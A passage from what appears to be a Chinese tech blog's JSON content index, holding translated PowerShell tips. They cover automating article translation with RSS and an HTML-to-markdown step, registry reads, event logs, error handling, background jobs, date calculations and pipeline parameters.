可以自由地调整源代码，加入新奇的功能，甚至可以用脚本来做站点搬家。 GitHub Pages 可以为我们提供免费的服务器。 一切都是开源的，您可以查看到这个站点的一切源代码、文章源文件，甚至所有的维护脚本。 我本身是一个 geek。 我已翻译了PowerShell 技能连载的 200 多篇文章。与此同时，我也采用各种技术方法提升翻译工作的效率。翻译一篇文章所占用的时间已从最初的 30 分钟缩短到现在的 10 分钟。以下部分将演示我是如何做到的。翻译一篇文章，需要经历以下步骤： 从 www.powershell.com 搜集新文章。 创建新的 markdown 文件。文件名对应原文的 url 地址。 编辑文件头的元数据。 将英文的内容转换成 markdown 格式，贴到文件正文部分。 在文本编辑器中，将英文内容逐段翻译成中文，并将原文逐段删除。 处理文章中的图片。 将它下载到本地。 以文章的文件名作为前缀，并加上序号作为文件名。 修正文章中的图片地址。 在浏览器中打开原文，以供对照参考。 我们可以用 PowerShell 逐一解决这些问题： 搜集新文章获取更新列表浏览 www.powershell.com 的源代码，发现该网站有提供 PowerShell tips 的 RSS 订阅： &lt;link rel=&quot;alternate&quot; type=&quot;application/atom+xml&quot; title=&quot;Power Tips (Atom 1.0)&quot; href=&quot;http://powershell.com/cs/blogs/tips/atom.aspx&quot; /&gt; 通过 RSS 服务，我们就可以通过编程的方式，自动化地获取文章的内容。 $atomUrl = 'http://powershell.com/cs/blogs/tips/atom.aspx' $feed = Invoke-RestMethod $atomUrl 获取到的 $feed 变量大概是这样的一个数组： title : Using Profile Scripts link : link id : /cs/blogs/tips/archive/2014/06/13/using-profile-scripts.aspx published : 2014-06-13T11:00:00Z updated : 2014-06-13T11:00:00Z content : content author : author title : Be Aware of Side Effects link : link id : /cs/blogs/tips/archive/2014/06/12/be-aware-of-side-effects.aspx published : 2014-06-12T11:00:00Z updated : 2014-06-12T11:00:00Z content : content author : author 其中 link、id、content 对我们有用。content 是 XmlElement 类型的对象，我们一会儿会用到。 从更新列表中提取文章信息由于 id 的变化部分是以 yyyy/mm/dd 开头的，所以我们可以放心地用 Sort-Object 直接进行字符串排序。这个 cmdlet 有个常用的别名，叫做 sort。 接下来用正则表达式提取 year、month、day、name 这几个元素。通过这些元素，我们就可以组织目标文件名： $feed | sort { $_.id } | foreach { $entry = $_ if ($entry.id -cmatch '^/cs/blogs/tips/archive/(?&lt;year&gt;\\d{4})/(?&lt;month&gt;\\d{2})/(?&lt;day&gt;\\d{2})/(?&lt;name&gt;.+)\\.aspx$') { $year = $matches['year'] $month = $matches['month'] $day = $matches['day'] $name = $matches['name'] } $targetFile = Join-Path $folder &quot;$year-$month-$day-$name.md&quot; 跳过已有的文件由于 RSS 中返回的是最后 15 篇文章，也就是近 3 周来的文章列表，如果遇到已翻译过的文章，需要自动跳过： if (Test-Path $targetFile) { echo &quot;[文件已存在] $year-$month-$day-$name.md&quot; } else { 生成 markdown 文件模板方法每篇文章对应一个 markdown 文件。在文件的头部，有一段用 yaml 描述的元数据，也就是用两条 --- 分隔的部分： function Get-Post ($enty) { $postTemplate = @' layout: post title: &quot;PowerShell 技能连载 - ___&quot; description: &quot;PowerTip of the Day - {0}&quot; categories: [powershell, tip] tags: [powershell, tip, powertip, series, translation] {1} &lt;!--more--&gt; 本文国际来源：[{2}]({3}) '@ $entryUrl = 'http://powershell.com' + $entry.link.href $htmlContent = $entry.content.'#text' $htmlDoc = Get-Document $htmlContent $htmlContent = $htmlDoc.documentElement.innerHTML $htmlDoc.Close() $markdown = Get-Markdown $htmlContent return $postTemplate -f $entry.title, $markdown, $entry.title, $entryUrl } 代码中的 $postTemplate 是一个用 here string 描述的文件模板，其中所有的变量都用 {x} 占位符来代替。而 title 部分的 ___ 是为中文名称预留的位置。由于程序无法自动填充中文名，所以这个位置需要在人工翻译阶段手动填充。 函数尾部的 $postTemplate -f $entry.title, $markdown, $entry.title, $entryUrl 是采用字符串的 -f 运算符进行格式化，将各个变量填充到 {x} 占位符处。-f 的本质是调用了 String 类的 Format() 静态方法。 解析 DOM 结构上述代码调用了一个 Get-Document 函数，将 $htmlContent 字符串转换为一个 DOM 对象。它的实现方法如下： function Get-Document($text) { $htmlDoc= New-Object -com &quot;HTMLFILE&quot; if ($htmlDoc.IHTMLDocument2_write) { $htmlDoc.IHTMLDocument2_write($text) } else { $htmlDoc.write($text) } return $htmlDoc } 这里采用了 HTMLFILE COM 对象的 IHTMLDocument2_write() 或 write() 方法，来返回一个 HtmlDocument 对象。因为我发现不同的机器上，存在不同的版本。很遗憾关于这块的 MSDN 文档不太好找，这是我自创的方式，有效果，不知有没有更好的方法实现。 拿到 HtmlDocument 以后，就可以进行 DOM 操作了。这里我们简单地获取 Document 对象的 innerHTML 属性，并且注意及时关闭 COM 对象以释放资源： $htmlContent = $htmlDoc.documentElement.innerHTML $htmlDoc.Close() 将 HTML 转换为 markdown编写 Node.js 程序在 PowerShell 和 .NET 的世界里，目前没有很理想的 HTML 转 markdown 库可用。不过 Node.js 中有一个不错的库 html2markdown。 由于 node.exe 传入太长的参数可能会有意想不到的问题，所以直接向 Node.js 程序传递 HTML 字符串不可靠。更可靠的方式是将 HTML 字符串保存到临时文件中，将临时文件的文件名传递给 Node.js 程序。 我们可以写一个 Node.js 的小程序，目的是让 PowerShell 以这种方式调用： node.exe index.js htmlFilePath markdownFilePath 其中 htmlFilePath 为输入的 HTML 文件路径，markdownFilePath 为输出的 markdown 文件路径。 接下来用 npm 快速创建一个 Node.js 工程（暂时也叫 html2markdown，虽然和库的名字相同，不过影响使用）： npm init html2markdown 对向导的提示一路回车即可。然后添加 html2markdown 库的引用： npm install html2markdown --save 生成好的 package.json 文件如下： { &quot;name&quot;: &quot;html2markdown&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;dependencies&quot;: { &quot;html2markdown&quot;: &quot;~1.1.0&quot; }, &quot;devDependencies&quot;: {}, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; } 接下来编写 index.js 脚本。这个脚本的原理是： 解析 node.exe 进程的参数，提取输入的 HTML 文件路径和输出的 markdown 文件路径 读入 HTML 文件内容 调用 html2markdown 将 HTML 转换为 markdown 写入 markdown 文件内容 index.js 脚本的内容如下： var html2markdown = require('html2markdown'), fs = require('fs'), args = process.argv.splice(2), htmlFile = args[0], markdownFile = args[1], html, markdown; html = fs.readFileSync(htmlFile, { encoding: 'utf8' }); markdown = html2markdown(html, { inlineStyle: true }); fs.writeFileSync(markdownFile, markdown); 通过 PowerShell 调用 Node.js以下代码是生成 $htmlFile、$markdownFile 两个临时文件，然后通过 node .\\html2markdown\\index.js $htmlFile $markdownFile 调用 Node.js 程序。当 Node.js 程序执行完毕以后，通过 gc 命令从输出的临时文件中获取 markdown 内容字符串，然后删除所有临时文件。 代码的第一行用正则表达把 HTML 中的 Twitter 回访链接给清理掉： function Get-Markdown ($html) { $html = $html -creplace '(?sm)^&lt;P&gt;&lt;A href=&quot;http://twitter\\.com/home/\\?status=.*$', '' $htmlFile = [System.IO.Path]::GetTempFileName() $markdownFile = [System.IO.Path]::GetTempFileName() sc $htmlFile $html node .\\html2markdown\\index.js $htmlFile $markdownFile $markdown = gc -Raw $markdownFile del $htmlFile del $markdownFile $markdown = $markdown.Trim() return $markdown } 到此为止，markdown 形式的文章内容已经生成好了。 下载文章中的图片到目前为止，文章中的图片都可以正常显示，不过它们都是位于 www.powershell.com 服务器上。从翻译的角度来说，图片最好保存一份到自己的服务器上，图片跟着文章走。这样就不会因为源网站服务器宕机或其它原因导致译文中的图片出问题。 markdown 中的图片是这样表示的： ![description](http://www.xxx.com/yyy.png) 我们假设文章的文件名是 aaa.md，那么需要做的事情是把 http://www.xxx.com/yyy.png 下载下来，保存在网站的 ..\\assets\\post_img 目录下，并且按 aaa-001.png、aaa-002.png 这样的方式重命名。这样就能很清楚地体现哪个图片是属于哪篇文章。 分析文章中的图片代码中采用这个正则表达式来提取图片的描述和 URL： [regex] '!\\[(?&lt;desc&gt;.*?)\\]\\((?&lt;url&gt;.*?)\\)' 这句代码是用来生成新的图片文件名： $targetPath = &quot;$fileBaseName-{0:d3}$extension&quot; -f $index++ 我们可以用一个泛型的哈希表（字典）来保存源路径和替换后的目标路径： [System.Collections.Generic.Dictionary[[string],[string]]] $dict = New-Object 'System.Collections.Generic.Dictionary[[string], [string]]' 它等效于 C# 中的这行代码： var dict = new Dictionary&lt;string, string&gt;(); 这里的 PowerShell 代码就显得不如 C# 直观了。 以下是实现代码： function Get-Picture($file) { $index = 1 $fileBaseName = ([System.IO.FileInfo]$file).BaseName [System.Collections.Generic.Dictionary[[string],[string]]] $dict = New-Object 'System.Collections.Generic.Dictionary[[string], [string]]' cat $file -Encoding UTF8 -Raw | % { $regex = [regex] '!\\[(?&lt;desc&gt;.*?)\\]\\((?&lt;url&gt;.*?)\\)' $matches = $regex.Matches($_) if ($matches.Count) { $matches.ForEach({ $fullMatch = $_.Value $desc = $_.Groups['desc'].Value $url = $_.Groups['url'].Value if ($url -like 'http*') { $extension = [System.IO.Path]::GetExtension($url) $targetPath = &quot;$fileBaseName-{0:d3}$extension&quot; -f $index++ $result = Download-Picture $url $targetPath if ($result) { $dict.Add($url, $targetPath) } } }) } } $newContent = cat $file -Encoding UTF8 -Raw | % { $line = $_ $dict.Keys | % { $url = $_ $newPath = $relateUrl + $dict[$url] $line = [string]$line.Replace($url, $newPath) } $line } $bytes = [System.Text.Encoding]::UTF8.GetBytes($newContent) sc $file $bytes -Encoding Byte #[IO.File]::WriteAllText($file, $newContent, [System.Text.Encoding]::UTF8) } 这里为什么用字典来保存源地址和目标地址呢？主要是因为我们不仅需要把每个匹配成功的结果替换成新的文本，还需要针对每个结果执行一段自定义的代码。利用字典先把匹配的结果保存起来，然后遍历字典项，对它们进行进一步的处理。 实际上有个更简单的办法。C# 中 Regex 对象的 Replace() 方法支持 lambda 表达式，对应的 PowerShell 方法支持用代码块的方式。MSDN 链接为 Regex.Replace 方法 (String, MatchEvaluator)。可以一边匹配一边做处理。 只是由于我先写出了文中的版本，所以没有去改进。 下载文章中的图片Invoke-WebRequest 可以方便地下载 HTTP 文件，这和 Linux 系统中的 wget 命令十分相似。实际上，Invoke-WebRequest 命令有个别名，就叫做 wget。下载图片的代码如下： function Download-Picture($url, $fileName) { echo &quot;downloading $url to $fileName&quot; $fullPath = Join-Path $downloadPath $fileName Invoke-WebRequest -Uri $url -OutFile $fullPath return $? } 综述到此为止，我已完整地介绍了《PowerShell 技能连载》翻译工作中采用脚本进行自动化的全部原理。相应的代码可以在 这里 找到。 读者也许会觉得为这些小小的功能用手工操作也可以完成。不过，简单计算一下就能够体现出产生的红利。目前已翻译了 200 多篇文章，按照每篇文章节约 3 分钟计算，自动化操作总共为我节约了 600 分钟，也就是节约了 10 个小时的机械劳动。用这宝贵的一个多工作日来开发脚本、撰写心得，做些动脑筋的事情，不亦是一种提升么？","link":"/2014/06/14/generate-powershell-tips-automatically/"},{"title":"PowerShell 技能连载 - 通过按键跳过配置脚本","text":"有些时候您也许希望跳过配置文件中的某些部分。例如，在 ISE 编辑器中，只需要将这段代码加入您的配置脚本（配置脚本的路径可以在通过 $profile 变量查看，它也有可能还没有创建）： if([System.Windows.Input.Keyboard]::IsKeyDown('Ctrl')) { return } 如果您启动 ISE 编辑器时按住 CTRL 键，将跳过您配置脚本中的剩余部分。 或者，您可以这样使用： if([System.Windows.Input.Keyboard]::IsKeyDown('Ctrl') -eq $false) { Write-Warning 'You DID NOT press CTRL, so I could execute things here.' } 这样写的话，仅当您启动 ISE 时没有按住 CTRL 键时，才会运行花括号内部的代码。 如果您希望这段代码也能用在 PowerShel 控制台中，那么需要加载对应的程序集。这段代码在所有的配置脚本中都通用： Add-Type -AssemblyName PresentationFramework if([System.Windows.Input.Keyboard]::IsKeyDown('Ctrl') -eq $false) { Write-Warning 'You DID NOT press CTRL, so I could execute things here.' }","link":"/2014/06/16/skipping-profile-on-keystroke/"},{"title":"PowerShell 技能连载 - 有趣的路径名","text":"您可以用 -split 运算符轻松地将一个路径分割成独立的部分。结果是一个数组。 只需要用比较运算符来排除您不需要的部分，或者对其中的一部分改名，然后用 -join 运算符将路径合并回来。 以下代码将排除掉某个路径下所有包含单词“test”的子文件夹： $path = 'C:\\folder\\test\\unit1\\testing\\results\\report.txt' $path -split '\\\\' -notlike '*test*' -join '\\'","link":"/2014/06/17/fun-with-path-names/"},{"title":"PowerShell 技能连载 - 不中断处理 Cmdlet 中的错误","text":"当您想要错误处理器处理 cmdlet 内部产生的错误时，您只能将该 cmdlet 的 -ErrorAction 设为 Stop 才能捕获这类异常。否则，cmdlet 将在内部处理该错误。 这么做是有副作用的，因为将 -ErrorAction 设为 Stop 将会在发生第一个错误的时候停止该 cmdlet。 所以如果您希望不中断一个 cmdlet 并仍然能够获得该 cmdlet 产生的所有错误，那么请使用 -ErrorVariable。这段代码递归地获取您 Windows 文件夹中的所有 PowerShell 脚本（可能需要消耗一些时间）。错误不会导致停止执行，而是记录到一个变量中： Get-ChildItem -Path c:\\Windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable myErrors 当该 cmdlet 执行完成以后，您可以检测 $myErrors 变量。它包含了所有发生的错误信息。例如，这段代码可以获取所有 Get-ChildItem 无法进入的子文件夹列表： $myErrors.TargetObject 上面一段代码使用了自动展开特性（PowerShell 3.0 中引入）。所以在 PowerShell 2.0 中，您需要这么写： $myErrors | Select-Object -ExpandProperty TargetObject","link":"/2014/06/18/handling-cmdlet-errors-without-interruption/"},{"title":"PowerShell 技能连载 - 轻松读取注册表键值","text":"使用 PowerShell 读取注册表是小菜一碟。以下是一段代码模板： $RegPath = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion' $key = Get-ItemProperty -Path &quot;Registry::$RegPath&quot; 现在，只需要将 RegPath 替换成任意的注册表项路径。您还可以从 regedit.exe 中复制粘贴项路径。 当您运行完这段代码，$key 变量被赋值以后，只需键入 $key 以及 .，智能提示将列出该项下的所有键名，您可以简单地选取您希望读取的键。在控制台中，当您键入 . 之后按下 TAB 键可以显示所有可用的键名： $key.CommonFilesDir $key.MediaPathUnexpanded $key.ProgramW6432Dir","link":"/2014/06/19/reading-registry-values-the-easy-way/"},{"title":"PowerShell 技能连载 - 用事件日志代替日志文件","text":"人们常常使用文件来记录日志。这样做并没有错，但是使用 Windows 内置的事件日志系统可能会简单得多。 如果您有管理员权限，您可以随时创建新的事件日志： New-EventLog -LogName myLog -Source JobDue, JobDone, Remark 这将创建一个名为“myLog”的新日志，它的来源为“JobDue”、“JobDone”和“Remark”。管理员权限只是用来创建事件日志用。剩下的操作任何普通用户都可以操作。现在您的日志可以记录到新的事件日志中。 Write-EventLog -LogName myLog -Source JobDue -EntryType Information -EventId 1 -Message 'This could be a job description.' Write-EventLog -LogName myLog -Source JobDue -EntryType Information -EventId 1 -Message 'This could be another job description.' 通过 Get-EventLog 命令，您可以轻松地解析您的日志并且查找信息： Get-EventLog -LogName myLog -Source JobDue -After 2014-05-10 通过 Limit-EventLog，您还可以配置您的日志，限制最大大小。","link":"/2014/06/20/using-event-logs-instead-of-log-files/"},{"title":"显示、隐藏 PowerShell","text":"在 WPF 之周中，有个朋友希望有个最小化 PowerShell 窗口的例子。 以下是一个快速实现该需求的 module。只要将以下代码复制粘贴到 Documents\\WindowsPowerShell\\Packages\\PowerShell\\PowerShell.psm1 即可。 $script:showWindowAsync = Add-Type –memberDefinition @&quot; [DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); &quot;@ -name &quot;Win32ShowWindowAsync&quot; -namespace Win32Functions –passThru function Show-PowerShell() { $null = $showWindowAsync::ShowWindowAsync((Get-Process –id $pid).MainWindowHandle, 10) } function Hide-PowerShell() { $null = $showWindowAsync::ShowWindowAsync((Get-Process –id $pid).MainWindowHandle, 2) } 现在，您可以用这段代码来显示或隐藏 PowerShell： Add-Module PowerShell # Minimize PowerShell Hide-PowerShell sleep 2 # Then Restore it Show-PowerShell 希望这篇文章有所帮助。James Brundage[MSFT] 译者注：ShowWindowAsync() 的第二个参数取值范围可以参照 API 文档 ShowWindow function本文国际来源","link":"/2014/06/23/show-powershell-hide-powershell/"},{"title":"PowerShell 技能连载 - 加速数组操作","text":"当您频繁地向数组添加新元素时，您可能会遇到性能问题。以下是一个演示这个问题的反例，您应该避免这样使用： Measure-Command { $ar = @() for ($x=0; $x -lt 10000; $x++) { $ar += $x } } 在循环中，数组用“+=”运算符不断地添加新元素。这将消耗许多时间，因为每次改变数组的大小时，PowerShell 都需要创建一个新的数组。 以下是一个快许多倍的实现方式——用 ArrayList，它专门为大小变化的情况设计： Measure-Command { $ar = New-Object -TypeName System.Collections.ArrayList for ($x=0; $x -lt 10000; $x++) { $ar.Add($x) } } 两段代码实现相同的效果，但第二段效率要高得多。","link":"/2014/06/23/speeding-up-arrays/"},{"title":"PowerShell 技能连载 - 使用嵌套的哈希表","text":"嵌套的哈希表是代替多维数组的好方法。它能以易于管理的方式存储数据集合。让我们看一个例子： $person = @{} $person.Name = 'Weltner' $person.Id = 12 $person.Address = @{} $person.Address.Street = 'Canyon Rim' $person.Address.City = 'Folsom' $person.Address.Details = @{} $person.Address.Details.Story = 4 $person.Address.Details.ScenicView = $false 这段代码定义了一个 person 变量。您可以这样查看 person 的内容： PS&gt; $person Name Value ---- ----- Name Weltner Id 12 Address {Street, Details, City} 您还可以这样方便地获取其中的一部分信息： PS&gt; $person Name Weltner PS&gt; $person.Address.City Folsom PS&gt; $person.Address.Details.ScenicView False","link":"/2014/06/24/using-nested-hash-tables/"},{"title":"PowerShell 技能连载 - 处理环境变量","text":"要在 PowerShell 中读取 Windows 环境变量，只需要使用“env:”前缀： PS&gt; $env:windir C:\\Windows PS&gt; $env:USERNAME Tobias 实际上，“env:”是一个虚拟驱动器，所以您可以用它来查找所有（或一部分）环境变量。这段代码将列出所有名字中含有“user”的环境变量： PS&gt; dir env:\\*user* Name Value ---- ----- USERPROFILE C:\\Users\\Tobias USERNAME Tobias ALLUSERSPROFILE C:\\ProgramData USERDOMAIN TobiasAir1","link":"/2014/06/25/dealing-with-environment-variables/"},{"title":"PowerShell 技能连载 - 使用 break、continue 和 return 语句","text":"在 PowerShell 的循环中，有两个特殊的关键字：break 和 continue。 使用 continue，循环继续执行，但是跳过剩下的代码。当您执行 break 时，循环提前结束并返回所有的结果。 另外，还有一个关键字 return。它将导致立即退出当前的作用域。所以当您在一个函数中执行 return，那么该函数将会退出而如果您在一个脚本中执行 return，那么整个脚本将退出。","link":"/2014/06/26/using-break-continue-and-return/"},{"title":"PowerShell 技能连载 - 理解 exit 语句","text":"PowerShell 支持基于作用域的 exit 关键字。它的工作方式也许和您想象的很不一样。 我们假设有这样一个函数： function test { 'A' exit 'B' } 当您将这个函数保存为一个脚本文件，然后执行这个脚本，将得到以下结果： PS&gt; C:\\Users\\Tobias\\Documents\\PowerShell\\test12343.ps1 A 这意味着 exit 使函数提前退出。然而，当您没有保存该脚本，或当您以交互式的方式调用该函数，您的整个 PowerShell 宿主将会关闭。 exit 将会导致调用者上下文退出，而不仅仅是所在的函数。所以如果您将脚本像这样保存，您也许会有意外发现： function test { 'A' exit 'B' } 'Start' test 'Stop' 现在的结果类似这样： PS&gt; C:\\Users\\Tobias\\Documents\\PowerShell\\test12343.ps1 Start A 如您所见，“Stop”语句不再能执行到。exit 使得函数和调用者作用域都退出了。这是为什么您以交互式执行该函数会导致您的 PowerShell 被关闭的原因（因为此时您的调用者作用域是宿主本身）。 那么 exit 应该怎么使用？当脚本执行结束的时候您可以用它来设置错误等级（error level）。该错误等级可以被调用者读取，所以如果您通过计划任务启动一个 PowerShell 脚本，或者用批处理文件通过 powershell.exe 来启动它，那么您通过 exit 指定的数值将会作为脚本的返回值，并赋值给批处理文件的 %ERRORLEVEL% 变量。","link":"/2014/06/27/understanding-the-statement-quot-exit-quot/"},{"title":"PowerShell 技能连载 - 加速后台任务","text":"后台任务可以大大提速脚本的执行，因为它们可以并行执行。然而，后台任务只适用于执行的代码不会产生大量的数据——因为通过 XML 序列化返回数据可能会消耗掉比串行操作节约出来的更多的时间。 幸运的是，您可以控制后台操作可以返回多少数据。让我们看看如何实现。 这段代码中有三个任务（$code1-3）并发执行。两个为后台任务，另一个操作 PowerShell 前台。 $start = Get-Date $code1 = { Get-Hotfix } $code2 = { Get-ChildItem $env:windir\\system32\\*.dll } $code3 = { Get-Content -Path C:\\Windows\\WindowsUpdate.log } $job1 = Start-Job -ScriptBlock $code1 $job2 = Start-Job -ScriptBlock $code2 $result3 = &amp; $code3 $alljobs = Wait-Job $job1, $job2 Remove-Job -Job $alljobs $result1, $result2 = Receive-Job $alljobs $end = Get-Date $timespan = $end - $start $seconds = $timespan.TotalSeconds Write-Host &quot;This took me $seconds seconds.&quot; 这将消耗大约半分钟时间。而当您顺序执行这三个任务，而不是用后台任务，它们只消耗 5 秒钟。 $start = Get-Date $result1 = Get-Hotfix $result2 = Get-ChildItem $env:windir\\system32\\*.dll $result3 = Get-Content -Path C:\\Windows\\WindowsUpdate.log $end = Get-Date $timespan = $end - $start $seconds = $timespan.TotalSeconds Write-Host &quot;This took me $seconds seconds.&quot; 所以后台任务不仅增加了代码的复杂度，并且还延长了脚本的执行时间。只有优化过的返回数据才有意义。传递越少数据越好。 $start = Get-Date $code1 = { Get-Hotfix | Select-Object -ExpandProperty HotfixID } $code2 = { Get-Content -Path C:\\Windows\\WindowsUpdate.log | Where-Object { $_ -like '*successfully installed*' }} $code3 = { Get-ChildItem $env:windir\\system32\\*.dll | Select-Object -ExpandProperty Name } $job1 = Start-Job -ScriptBlock $code1 $job2 = Start-Job -ScriptBlock $code2 $result3 = &amp; $code3 $alljobs = Wait-Job $job1, $job2 Remove-Job -Job $alljobs $result1, $result2 = Receive-Job $alljob 这一次，后台任务只返回必须的数据，大大提升了执行效率。 总的来说，后台任务适合于做一些简单的事情（例如配置）而不返回任何数据或只返回少量的数据。","link":"/2014/06/30/speeding-up-background-jobs/"},{"title":"PowerShell 技能连载 - 为什么目录的大小为 1","text":"你也许偶然注意到，文件夹的 Length 为 1 字节。这是从 PowerShell 3.0 开始的。在 PowerShell 2.0 中，Length 并没有任何值。 $folder = Get-Item c:\\Windows $folder.Length 这个结果是由另一个特性导致的。一个对象如果不包含“Count”或“Length”属性，它也会隐式地含有这两个属性，并且预设值为 1。 PS&gt; $host.length 1 PS&gt; $host.Count 1 PS&gt; (Get-Date).Length 1 PS&gt; (Get-Date).Count 1 PS&gt; $ConfirmPreference.Length 1 PS&gt; $ConfirmPreference.Count 1 在过去，通常只有数组才有 Length 或 Count 属性。所以当一个 cmdlet 或 函数仅返回 1 个对象（或 0 个对象）时，结果不会被包装成数组。而导致获取结果的数量时发生错误。 通过这个新“特性”，如果一个命令只返回一个对象，那么添加的“Count”属性总是返回“1”，意味着返回了 1 个元素。","link":"/2014/07/01/why-directories-have-a-size-of-1/"},{"title":"PowerShell 技能连载 - 列出工作日","text":"以下单行代码可以列出指定月份的所有工作日： $month = 7 1..31 | ForEach-Object { Get-Date -Day $_ -Month $month } | Where-Object { $_.DayOfWeek -gt 0 -and $_.DayOfWeek -lt 6 } 只需要将月份赋值给 $month（例子中以 7 月为例）。 多添一些代码，就可以从管道中返回工作日的数量： $month = 7 1..31 | ForEach-Object { Get-Date -Day $_ -Month $month } | Where-Object { $_.DayOfWeek -gt 0 -and $_.DayOfWeek -lt 6 } | Measure-Object | Select-Object -ExpandProperty Count","link":"/2014/07/02/finding-working-days/"},{"title":"PowerShell 技能连载 - 通过 StringBuilder 加速脚本","text":"我们的脚本常常需要向已有的文本中添加新的文本。以下是一段您可能很熟悉的代码： Measure-Command { $text = &quot;Hello&quot; for ($x=0; $x -lt 100000; $x++) { $text += &quot;status $x&quot; } $text } 这段代码运行起来非常慢，因为当您向字符串中添加文本时，整个字符串都需要重新构造。然而，有一个专用的对象，叫做 StringBuilder。它可以做相同的事情，但是速度飞快： Measure-Command { $sb = New-Object -TypeName System.Text.StringBuilder $null = $sb.Append(&quot;Hello&quot;) for ($x=0; $x -lt 100000; $x++) { $null = $sb.Append(&quot;status $x&quot;) } $sb.ToString() }","link":"/2014/07/03/speeding-up-scripts-with-stringbuilder/"},{"title":"PowerShell 技能连载 - 使用缺省参数","text":"在 PowerShell 3.0 中，任意的 cmdlet 参数都可以定义一个缺省值。 例如这行代码，将设置所有 cmdlet 的 -Path 参数的缺省值为一个指定的路径： $PSDefaultParameterValues.Add('*:Path', 'c:\\Windows') 所以当您运行 Get-ChildItem 或任何其它包含 -Path 参数的 cmdlet 时，看起来好像您已经指定了这个参数。 除了 * 之外，您当然也可以指定 cmdlet 的名称。所以如果您希望将 Get-WmiObject 的 -ComputerName 参数设置为指定的远程主机，那么只需要这样做： $PSDefaultParameterValues.Add('Get-WmiObject:ComputerName', 'server12') 所有这些缺省值只在当前的 PowerShell 会话中有效。如果您想使它们始终有效，那么只需要在您的配置脚本中定义缺省值即可。 要移除所有的缺省值，请使用这行代码： $PSDefaultParameterValues.Clear()","link":"/2014/07/04/using-default-parameters/"},{"title":"PowerShell 技能连载 - 查找两个日期之间的所有日子","text":"如果您需要知道两个日期之间的间隔天数，那么可以用 New-TimeSpan 轻松地获得： $startdate = Get-Date $enddate = Get-Date -Date '2014-09-12' $difference = New-TimeSpan -Start $startdate -End $enddate $difference.Days 然而，如果您不仅想知道两者之间的间隔天数，而且还希望精确地获取每一天的日期对象，那么可以用这个方法： $startdate = Get-Date $enddate = Get-Date -Date '2014-09-12' $difference = New-TimeSpan -Start $startdate -End $enddate $days = [Math]::Ceiling($difference.TotalDays)+1 1..$days | ForEach-Object { $startdate $startdate = $startdate.AddDays(1) } 这一次，PowerShell 输出两个指定日期之间的所有日期对象。 当您了解了精确获取每个日期对象（而不仅是总天数）的方法之后，您可以过滤（例如以星期数），并查找距离您放假或退休之前还有多少个星期天或工作日。 以下代码是获取工作日用的： $startdate = Get-Date $enddate = Get-Date -Date '2014-09-12' $difference = New-TimeSpan -Start $startdate -End $enddate $difference.Days $days = [Math]::Ceiling($difference.TotalDays)+1 1..$days | ForEach-Object { $startdate $startdate = $startdate.AddDays(1) } | Where-Object { $_.DayOfWeek -gt 0 -and $_.DayOfWeek -lt 6} 这段代码时统计工作日天数用的： $startdate = Get-Date $enddate = Get-Date -Date '2014-09-12' $difference = New-TimeSpan -Start $startdate -End $enddate &quot;Days in all: &quot; + $difference.Days $days = [Math]::Ceiling($difference.TotalDays)+1 $workdays = 1..$days | ForEach-Object { $startdate $startdate = $startdate.AddDays(1) } | Where-Object { $_.DayOfWeek -gt 0 -and $_.DayOfWeek -lt 6} | Measure-Object | Select-Object -ExpandProperty Count &quot;Workdays: $workdays&quot;","link":"/2014/07/07/finding-dates-between-two-dates/"},{"title":"PowerShell 技能连载 - 复制命令行历史记录","text":"如果您在使用 PowerShell 的过程中突然发现刚才键入的某些代码起作用了，您接下来会想把这些代码复制并粘贴到一个脚本编辑器中，将它们保存起来，然后分享给朋友。 以下是操作方法： Get-History -Count 5 | Select-Object -ExpandProperty CommandLine | clip.exe 这将会把您最后键入的 5 条命令复制到剪贴板中。","link":"/2014/07/08/copying-command-history/"},{"title":"PowerShell 技能连载 - 复制命令行历史的工具函数","text":"在前一个技能中我们演示了如何将之前键入的交互式 PowerShell 命令复制到您喜欢的脚本编辑器中。以下是一个能让操作更加简化的函数。如果您喜欢它，您可以将它加入您的配置脚本，那么就可以随时调用它： function Get-MyGeniusInput { param ( $Count, $Minute = 10000 ) $cutoff = (Get-Date).AddMinutes(-$Minute) $null = $PSBoundParameters.Remove('Minute') $result = Get-History @PSBoundParameters | Where-Object { $_.StartExecutionTime -gt $cutoff } | Select-Object -ExpandProperty CommandLine $count = $result.Count $result | clip.exe Write-Warning &quot;Copied $count command lines to the clipboard!&quot; } Get-MyGeniusInput 默认将所有命令行历史都复制到剪贴板。通过 -Count 参数，您可以指定复制的条数，例如最后 5 条命令。而通过 -Minute 参数，您可以指定复制多少分钟之内的历史记录。 PS&gt; Get-MyGeniusInput -Minute 25 WARNING: Copied 32 command lines to the clipboard! PS&gt; Get-MyGeniusInput -Minute 25 -Count 5 WARNING: Copied 5 command lines to the clipboard! PS&gt;","link":"/2014/07/09/copying-command-history-as-a-tool/"},{"title":"PowerShell 技能连载 - 简单地读取注册表值","text":"以下是最简单的读取注册表值的方法： $Key = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' $Name = 'RegisteredOwner' $result = (Get-ItemProperty -Path &quot;Registry::$Key&quot; -ErrorAction Stop).$Name &quot;Registered Windows Owner: $result&quot; 只需要将 $Key 替换成注册表项，将 $Name 替换成注册表键，就能读取它的值。","link":"/2014/07/10/reading-registry-values-easily/"},{"title":"PowerShell 技能连载 - 接受多重输入","text":"当您创建 PowerShell 函数时，以下是一个定义了既能够从参数中获取值，又能从管道中获取值的多功能 InputObject 参数的代码模板： function Get-Something { param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [Object[]] $InputObject ) process { $InputObject | ForEach-Object { $element = $_ &quot;processing $element&quot; } } } 这是该函数的使用效果： PS&gt; Get-Something -InputObject 1,2,3,4 processing 1 processing 2 processing 3 processing 4 PS&gt; 1,2,3,4 | Get-Something processing 1 processing 2 processing 3 processing 4 请注意这个参数被定义成对象数组（所以它可以接收多个值）。然后，该参数值被送到 ForEach-Object 命令，将值一个一个取出来。这是针对第一个例子的调用方式。 要能够从管道中接收多个值，请确保对接收管道输入的参数设置了 